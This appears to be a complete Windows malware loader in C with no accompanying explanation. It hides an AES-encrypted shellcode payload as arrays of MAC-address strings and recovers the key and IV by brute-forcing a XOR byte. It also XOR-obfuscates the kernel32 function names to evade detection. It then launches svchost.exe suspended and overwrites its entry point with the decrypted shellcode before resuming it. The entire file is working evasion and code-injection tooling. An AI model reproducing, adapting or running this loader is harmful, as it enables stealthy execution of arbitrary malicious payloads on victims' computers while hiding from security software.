#include <Windows.h>
#include <stdio.h>
#include "CtAes.h"

typedef NTSTATUS(NTAPI* fnRtlEthernetStringToAddressA)(PCSTR S, PCSTR* Terminator, PVOID Addr);

BOOL MacDeobfuscation(IN CHAR* cMacArray[], IN SIZE_T sNmbrOfElements, OUT PBYTE* ppDeobfuscatedBuffer, OUT SIZE_T* psDeobfuscatedSize) {

    NTSTATUS STATUS = 0x00;
    fnRtlEthernetStringToAddressA pRtlEthernetStringToAddressA = NULL;
    PBYTE pDeobfuscatedBuff = NULL, pTmpBufferPntr = NULL;
    PCSTR Terminator = NULL;
    HMODULE hNtdll = NULL;

    if (!(hNtdll = GetModuleHandle("ntdll"))) {
        return FALSE;
    }

    if ((pRtlEthernetStringToAddressA = (fnRtlEthernetStringToAddressA)GetProcAddress(hNtdll, "RtlEthernetStringToAddressA")) == NULL) {
        return FALSE;
    }

    *psDeobfuscatedSize = sNmbrOfElements * 6;

    if ((pTmpBufferPntr = pDeobfuscatedBuff = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *psDeobfuscatedSize)) == NULL) {
        return FALSE;
    }

    for (int i = 0; i < sNmbrOfElements; i++) {

        if (cMacArray[i] == NULL) {
            break;
        }

        if ((STATUS = pRtlEthernetStringToAddressA(cMacArray[i], &Terminator, pTmpBufferPntr)) != 0x0) {
            return FALSE;
        }

        pTmpBufferPntr = (PBYTE)(pTmpBufferPntr + 6);
    }

    *ppDeobfuscatedBuffer = pDeobfuscatedBuff;

    return TRUE;
}

BYTE BruteForceDecryptionKey(IN PBYTE pKeyArray, IN SIZE_T sKeySize) {
    int i = 0x00;
    for (i = 0; i <= 0xFF; i++) {
        if (((pKeyArray[1] ^ i) % 0xFF) == 0x8B) {
            break;
        }
    }

    for (int x = 0; x < sKeySize; x++)
        pKeyArray[x] = pKeyArray[x] ^ i;
    return i;
}

BYTE BruteForceDecryptionIv(IN PBYTE pKeyArray, IN SIZE_T sKeySize) {
    int i = 0x00;
    for (i = 0; i <= 0xFF; i++) {
        if (((pKeyArray[1] ^ i) % 0xFF) == 0x3C) {
            break;
        }
    }

    for (int x = 0; x < sKeySize; x++)
        pKeyArray[x] = pKeyArray[x] ^ i;
    return i;
}

char* mac1[78] = {
        "25-03-D5-A9-BC-F7", "DF-5A-CD-F4-75-6A", "20-F2-0D-4A-A9-9C", "70-87-AC-55-1F-CD",
        "6D-56-2E-96-9F-94", "26-1D-1C-7B-73-F5", "DA-F9-78-3E-C8-6B", "E6-46-EA-52-32-E3",
        "11-AE-14-F8-58-4E", "44-82-C0-C5-EF-61", "C1-6A-9B-3C-E3-7C", "A9-AC-5C-95-52-B7",
        "D7-06-66-02-4A-9B", "65-D6-CF-D7-4D-EB", "A6-0D-0B-F3-EF-DF", "44-E9-92-26-93-0E",
        "88-01-FC-99-F5-3E", "13-DB-41-80-AE-2B", "DD-71-02-01-7C-82", "BD-0E-7B-CE-1D-29",
        "41-1C-C8-BD-C1-47", "BC-38-6C-D4-5C-51", "AE-FA-85-D1-6D-E3", "FA-79-88-3C-EF-69",
        "C8-1F-AE-5F-0D-FA", "84-7C-27-7D-1F-4A", "96-62-7E-84-ED-E2", "87-40-EC-05-FE-11",
        "55-1E-C2-8D-0F-3D", "C9-2C-FF-39-6C-81", "C1-83-DF-41-6A-8E", "A0-7D-9E-91-8E-36",
        "26-4E-05-EF-5C-0F", "54-F2-E6-41-48-E9", "AB-D1-B2-1C-B7-4F", "53-42-DB-66-AD-71",
        "9D-EE-43-58-7B-4E", "D4-32-FE-F7-00-AC", "76-B0-9F-DE-DC-F1", "9C-53-C9-40-6A-E5",
        "3D-71-C2-D3-21-9C", "DF-B2-32-43-98-E7", "8C-B2-19-85-9A-C3", "98-0A-D1-1A-B0-62",
        "FF-2E-41-49-32-1B", "75-10-56-0E-39-D0", "E5-C4-D3-E2-6F-A8", "C8-7B-02-E7-28-27",
        "91-C6-8F-39-6F-2C", "87-C7-5A-05-B1-C1", "FA-7C-32-9C-7B-40", "F2-9F-C4-7C-5D-85",
        "E9-86-B5-25-EE-7E", "F7-61-F7-04-DC-07", "C1-ED-E8-EF-8B-37", "85-E6-33-FC-4E-86",
        "83-1F-14-A0-DB-D2", "D2-49-7E-07-2B-9D", "45-29-69-EC-DE-68", "62-66-68-84-14-17",
        "EF-7C-5D-12-9A-08", "52-5A-D5-96-4F-05", "A4-AB-CA-34-A7-A3", "FC-6D-B7-A6-02-65",
        "D8-1D-4D-86-09-B5", "21-9F-B0-56-AC-8B", "67-39-68-C1-7D-12", "64-6F-F2-75-A8-F4",
        "63-BC-3E-B8-E6-C6", "30-54-04-5B-95-F8", "28-B2-27-A2-89-16", "AF-94-90-91-14-20",
        "86-45-E6-D8-5D-FE", "6B-18-EA-1E-59-0D", "37-1E-EC-AB-D4-5B", "31-1F-00-97-F8-94",
        "1C-33-60-7B-86-40", "40-23-00-00-00-00"
};

char* mac2[6] = {
        "87-3C-40-1B-24-12", "DB-A6-62-0F-41-B7", "21-B6-B3-F0-39-50", "A0-16-1C-62-E5-D1",
        "09-B1-58-F1-0F-C2", "08-DB-00-00-00-00"
};

char* mac3[3] = {
        "8E-26-BA-32-B8-A4", "40-F6-B6-68-68-51", "1C-0C-0C-A0-00-00"
};

BOOL InstallAesDecryptionViaCtAes(IN PBYTE pCipherTextBuffer, IN SIZE_T sCipherTextSize, IN PBYTE pAesKey, IN PBYTE pAesIv, OUT PBYTE* ppPlainTextBuffer, OUT SIZE_T* pPlainTextSize) {

    AES256_CBC_ctx AesCtx = { 0x00 };

    if (!pCipherTextBuffer || !sCipherTextSize || !ppPlainTextBuffer || !pAesKey || !pAesIv) {
        return FALSE;
    }

    if (!(*ppPlainTextBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sCipherTextSize))) {
        return FALSE;
    }

    RtlSecureZeroMemory(&AesCtx, sizeof(AES256_CBC_ctx));
    AES256_CBC_init(&AesCtx, pAesKey, pAesIv);
    AES256_CBC_decrypt(&AesCtx, (sCipherTextSize / 16), *ppPlainTextBuffer, pCipherTextBuffer);

    *pPlainTextSize = sCipherTextSize;

    return TRUE;
}

void xor_decrypt(unsigned char* data, const char* key, size_t data_len) {
    size_t key_len = strlen(key);

    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
    data[data_len] = '\0';
}

typedef BOOL(WINAPI* pCreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef BOOL(WINAPI* pGetThreadContext)(HANDLE, LPCONTEXT);
typedef BOOL(WINAPI* pReadProcessMemory)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* pCloseHandle)(HANDLE);
typedef DWORD(WINAPI* pResumeThread)(HANDLE);

int main() {

    PBYTE EncryptedShellcode = NULL;
    SIZE_T EncryptedSize = 0;
    PBYTE AesKey = NULL;
    SIZE_T KeySize = 0;
    PBYTE AesIv = NULL;
    SIZE_T IvSize = 0;

    if (!MacDeobfuscation(mac1, 86, &EncryptedShellcode, &EncryptedSize)) {
        return 1;
    }

    if (!MacDeobfuscation(mac2, 6, &AesKey, &KeySize)) {
        return 1;
    }

    if (!MacDeobfuscation(mac3, 3, &AesIv, &IvSize)) {
        return 1;
    }

    PBYTE DecryptedShellcode = NULL;
    SIZE_T DecryptedSize = 0;

    if (!BruteForceDecryptionKey(AesKey, KeySize)) {
        return -1;
    }

    if (!BruteForceDecryptionIv(AesIv, IvSize)) {
        return 1;
    }

    if (!InstallAesDecryptionViaCtAes(EncryptedShellcode, EncryptedSize, AesKey, AesIv, &DecryptedShellcode, &DecryptedSize)) {
        return -1;
    }

    unsigned char ker[] = { 0x00, 0x00, 0x00, 0x05, 0x00, 0x1e, 0x58, 0x57, 0x5c, 0x0f, 0x09, 0x1e, 0x00 };
    unsigned char cre[] = { 0x20, 0x00, 0x00, 0x02, 0x06, 0x00, 0x33, 0x00, 0x0a, 0x00, 0x17, 0x16, 0x10, 0x25, 0x00 };
    unsigned char get[] = { 0x20, 0x00, 0x00, 0x33, 0x0d, 0x06, 0x02, 0x04, 0x10, 0x24, 0x0a, 0x1a, 0x13, 0x00, 0x0c, 0x13 , 0x00 };
    unsigned char red[] = { 0x20, 0x00, 0x05, 0x16, 0x35, 0x16, 0x1d, 0x06, 0x01, 0x01, 0x16, 0x29, 0x17, 0x08, 0x0b, 0x00, 0x1c, 0x00 };
    unsigned char wri[] = { 0x20, 0x00, 0x00, 0x03, 0x17, 0x39, 0x05, 0x1d, 0x0a, 0x12, 0x01, 0x1a, 0x3a, 0x17, 0x04, 0x18, 0x00, 0x10, 0x00 };
    unsigned char clo[] = { 0x20, 0x00, 0x00, 0x10, 0x09, 0x27, 0x02, 0x02, 0x0b, 0x0f, 0x09, 0x00 };
    unsigned char res[] = { 0x20, 0x00, 0x00, 0x07, 0x08, 0x16, 0x26, 0x0d, 0x01, 0x17, 0x04, 0x17, 0x00 };

    const char* ker_key = "ker";
    const char* cre_key = "cre";
    const char* get_key = "get";
    const char* red_key = "red";
    const char* wri_key = "wri";
    const char* clo_key = "clo";
    const char* res_key = "res";

    xor_decrypt(ker, ker_key, sizeof(ker) - 1);
    xor_decrypt(cre, cre_key, sizeof(cre) - 1);
    xor_decrypt(get, get_key, sizeof(get) - 1);
    xor_decrypt(red, red_key, sizeof(red) - 1);
    xor_decrypt(wri, wri_key, sizeof(wri) - 1);
    xor_decrypt(clo, clo_key, sizeof(clo) - 1);
    xor_decrypt(res, res_key, sizeof(res) - 1);

    HMODULE hKernel32 = GetModuleHandleA((char*)ker);
    if (!hKernel32) {
        return 1;
    }

    pCreateProcessW obfCreateProcessW = (pCreateProcessW)GetProcAddress(hKernel32, (char*)cre);
    pGetThreadContext obfGetThreadContext = (pGetThreadContext)GetProcAddress(hKernel32, (char*)get);
    pReadProcessMemory obfReadProcessMemory = (pReadProcessMemory)GetProcAddress(hKernel32, (char*)red);
    pWriteProcessMemory obfWriteProcessMemory = (pWriteProcessMemory)GetProcAddress(hKernel32, (char*)wri);
    pCloseHandle obfCloseHandle = (pCloseHandle)GetProcAddress(hKernel32, (char*)clo);
    pResumeThread obfResumeThread = (pResumeThread)GetProcAddress(hKernel32, (char*)res);

    if (!obfCreateProcessW || !obfGetThreadContext || !obfReadProcessMemory || !obfWriteProcessMemory || !obfCloseHandle || !obfResumeThread) {
        return 1;
    }

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    CONTEXT context;
    IMAGE_DOS_HEADER dosHeader;
    IMAGE_NT_HEADERS peHeader;
    ULONG_PTR pBaseAddress = 0;
    SIZE_T dwRead = 0;
    SIZE_T numBytesWritten = 0;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!obfCreateProcessW(L"C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 1;
    }

    context.ContextFlags = CONTEXT_FULL;
    if (!obfGetThreadContext(pi.hThread, &context)) {
        return 1;
    }

    if (!obfReadProcessMemory(pi.hProcess, (LPCVOID)(context.Rdx + (sizeof(ULONG_PTR) * 2)), &pBaseAddress, sizeof(pBaseAddress), &dwRead)) {
        return 1;
    }

    if (!obfReadProcessMemory(pi.hProcess, (LPCVOID)pBaseAddress, &dosHeader, sizeof(dosHeader), &dwRead)) {
        return 1;
    }

    if (!obfReadProcessMemory(pi.hProcess, (LPCVOID)((BYTE*)pBaseAddress + dosHeader.e_lfanew), &peHeader, sizeof(peHeader), &dwRead)) {
        return 1;
    }

    LPVOID entryPoint = (LPVOID)((BYTE*)pBaseAddress + peHeader.OptionalHeader.AddressOfEntryPoint);

    if (!obfWriteProcessMemory(pi.hProcess, entryPoint, DecryptedShellcode, DecryptedSize, &numBytesWritten)) {
        return 1;
    }

    if (obfResumeThread(pi.hThread) == (DWORD)-1) {
        return 1;
    }

    return 0;
}
